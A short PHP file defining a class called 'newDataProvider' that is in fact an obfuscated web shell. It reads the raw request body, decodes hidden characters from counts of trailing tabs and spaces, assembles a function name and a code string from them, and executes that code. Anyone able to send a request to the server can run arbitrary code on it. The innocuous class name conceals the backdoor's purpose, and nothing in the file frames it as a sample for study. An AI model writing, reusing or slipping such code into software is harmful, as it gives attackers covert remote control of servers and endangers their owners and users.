<?php
class newDataProvider {
	function __construct() {
		$f = explode("\x00", file_get_contents("php://input"));
		$r = "";
		$c = "";
		for ($i = 0; $i < count($f); $i++){
			if ($i < 15) {
				$r .= $this->dataProcessor($f[$i]);
			} else {
				$c .= $this->dataProcessor($f[$i]);
			}
		}
		$t = $r('', "$c");
		$t();
	}
	function dataProcessor($li){
		preg_match('/([\t ]+)\r?\n?$/', $li, $m);
		if (isset($m[1])){
			$l = dechex(substr_count($m[1], "\t"));
			$r = dechex(substr_count($m[1], " "));
			$n = hexdec($l.$r);
			return chr($n);
		}
		return "";
	}
}
new newDataProvider();
